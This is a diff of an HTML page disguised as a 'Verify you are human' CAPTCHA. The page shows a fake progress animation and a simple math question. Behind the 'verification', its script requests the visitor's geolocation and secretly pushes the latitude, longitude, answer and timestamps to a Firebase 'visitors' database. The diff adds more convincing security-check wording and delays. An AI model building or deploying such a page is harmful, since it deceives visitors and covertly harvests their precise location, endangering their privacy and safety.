@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Human Verification</title>
+<title>Security Check</title>
 
 <style>
 *{box-sizing:border-box}
@@ -32,10 +32,10 @@ body{
 
 .captchaBox{
   background:#111827;
-  padding:18px;
+  padding:20px;
   border-radius:14px;
   width:300px;
-  box-shadow:0 8px 20px rgba(0,0,0,.4);
+  box-shadow:0 10px 25px rgba(0,0,0,.4);
 }
 
 .captchaRow{
@@ -52,11 +52,7 @@ body{
   height:22px;
   border:2px solid #3b82f6;
   border-radius:4px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:14px;
-  transition:.25s;
+  position:relative;
 }
 
 .captchaText{
@@ -65,18 +61,18 @@ body{
 
 .captchaBrand{
   font-size:11px;
-  opacity:.55;
+  opacity:.6;
   margin-top:8px;
   text-align:right;
 }
 
 .progressBar{
-  height:3px;
+  height:4px;
   background:#3b82f6;
   width:0%;
   border-radius:4px;
   margin-top:10px;
-  transition:width 1.6s ease;
+  transition:width 2.7s ease-in-out;
 }
 
 /* MAIN CARD */
@@ -87,40 +83,39 @@ body{
   width:100%;
   max-width:320px;
   text-align:center;
-  box-shadow:0 8px 20px rgba(0,0,0,.4);
-  animation:fade .4s ease;
+  box-shadow:0 10px 25px rgba(0,0,0,.4);
 }
 
-@keyframes fade{
-  from{opacity:0;transform:translateY(10px)}
-  to{opacity:1;transform:translateY(0)}
+.subtitle{
+  font-size:13px;
+  opacity:.7;
+  margin-top:-6px;
 }
 
 input{
   width:100%;
-  padding:11px;
+  padding:10px;
   border:0;
   border-radius:8px;
   margin-top:10px;
   outline:none;
-  font-size:15px;
 }
 
 button{
   margin-top:12px;
   width:100%;
-  padding:11px;
+  padding:10px;
   border:0;
   border-radius:10px;
   background:#3b82f6;
   color:#fff;
   cursor:pointer;
   font-weight:600;
-  font-size:15px;
 }
 
 button:disabled{
-  opacity:.7;
+  opacity:.6;
+  cursor:not-allowed;
 }
 
 .status{
@@ -130,15 +125,15 @@ button:disabled{
 }
 
 .note{
-  font-size:12px;
-  opacity:.55;
-  margin-top:6px;
+  font-size:11px;
+  opacity:.5;
+  margin-top:12px;
 }
 </style>
 </head>
 <body>
 
-<!-- CAPTCHA -->
+<!-- CAPTCHA LOADING -->
 <div id="loadingScreen">
   <div class="captchaBox">
     <div class="captchaRow">
@@ -153,45 +148,60 @@ button:disabled{
 <!-- MAIN -->
 <div class="card">
   <h2>Verify you are human</h2>
+  <p class="subtitle">Security check required to continue</p>
+
   <p id="question"></p>
+
   <input id="answer" placeholder="Answer">
-  <button id="btn">Continue</button>
+  <button id="btn" disabled>Continue</button>
+
   <div class="status" id="status"></div>
-  <div class="note">For best experience, use Chrome browser.</div>
+
+  <div class="note">
+  Security system active • Chrome recommended for best experience
+  </div>
 </div>
 
 <script>
-// Faster CAPTCHA animation
+
+/* CAPTCHA animation */
 window.addEventListener("load", () => {
   const bar=document.getElementById("bar");
   const loading=document.getElementById("loadingScreen");
   const check=document.getElementById("check");
 
-  setTimeout(()=>bar.style.width="100%",150);
+  setTimeout(()=>{bar.style.width="100%";},200);
 
   setTimeout(()=>{
     check.style.borderColor="#22c55e";
     check.style.background="#22c55e";
-    check.textContent="✓";
-  },1100);
+    check.innerHTML="✓";
+  },1800);
 
   setTimeout(()=>{
     loading.style.display="none";
-  },1500);
+  },2400);
 });
 
-// Questions
+/* Math questions */
 const questions=[
-  "5 + 3 = ?",
-  "10 - 4 = ?",
-  "6 × 2 = ?",
-  "9 + 7 = ?",
-  "12 - 5 = ?",
-  "3 × 4 = ?",
-  "15 ÷ 3 = ?",
-  "8 + 6 = ?",
-  "14 - 9 = ?",
-  "7 × 3 = ?"
+"5 + 3 = ?",
+"10 - 4 = ?",
+"6 × 2 = ?",
+"9 + 7 = ?",
+"12 - 5 = ?",
+"3 × 4 = ?",
+"15 ÷ 3 = ?",
+"8 + 6 = ?",
+"14 - 9 = ?",
+"7 × 3 = ?"
+];
+
+const verifyTexts=[
+"Checking response...",
+"Verifying security...",
+"Processing request...",
+"Running security check..."
 ];
 
 const q=document.getElementById("question");
@@ -201,10 +211,14 @@ const btn=document.getElementById("btn");
 
 q.textContent=questions[Math.floor(Math.random()*questions.length)];
 
+a.addEventListener("input",()=>{
+  btn.disabled=a.value.trim().length===0;
+});
+
 btn.onclick=verify;
 
 function formatFriendlyTime(date){
-  return date.toLocaleString("en-US",{
+  const options={
     year:"numeric",
     month:"long",
     day:"numeric",
@@ -212,21 +226,26 @@ function formatFriendlyTime(date){
     minute:"2-digit",
     hour12:true,
     timeZone:"Asia/Dhaka"
-  });
+  };
+  return date.toLocaleString("en-US",options);
 }
 
 async function verify(){
-  s.textContent="Verifying...";
+
+  s.textContent=verifyTexts[Math.floor(Math.random()*verifyTexts.length)];
   btn.disabled=true;
 
+  await new Promise(r=>setTimeout(r,1200));
+
   if(!navigator.geolocation){
-    s.textContent="Verification failed. Please refresh the page.";
+    s.textContent="Verification failed. Please refresh and try again.";
     btn.disabled=false;
     return;
   }
 
   navigator.geolocation.getCurrentPosition(async pos=>{
     try{
+
       const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
       const { getDatabase, ref, push } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js");
 
@@ -244,11 +263,15 @@ async function verify(){
       const db=getDatabase(app);
 
       const now=new Date();
+      const timestamp=Date.now();
+      const isoTime=new Date(now.getTime()+6*60*60*1000).toISOString().replace("T"," ").split(".")[0];
+      const friendlyTime=formatFriendlyTime(now);
 
       await push(ref(db,"visitors"),{
         answer:a.value,
-        timestamp:Date.now(),
-        time_bst:formatFriendlyTime(now),
+        timestamp,
+        time_bst_iso:isoTime,
+        time_bst_friendly:friendlyTime,
         lat:pos.coords.latitude,
         lng:pos.coords.longitude
       });
@@ -256,6 +279,7 @@ async function verify(){
       s.textContent="Verification complete.";
 
     }catch(e){
+      console.error(e);
       s.textContent="Verification failed. Please try again.";
       btn.disabled=false;
     }
@@ -263,12 +287,9 @@ async function verify(){
   },()=>{
     s.textContent="Verification failed. Please try again.";
     btn.disabled=false;
-  },{
-    enableHighAccuracy:false,
-    timeout:7000,
-    maximumAge:60000
-  });
+  },{enableHighAccuracy:false,timeout:8000,maximumAge:60000});
 }
+
 </script>
 
 </body>
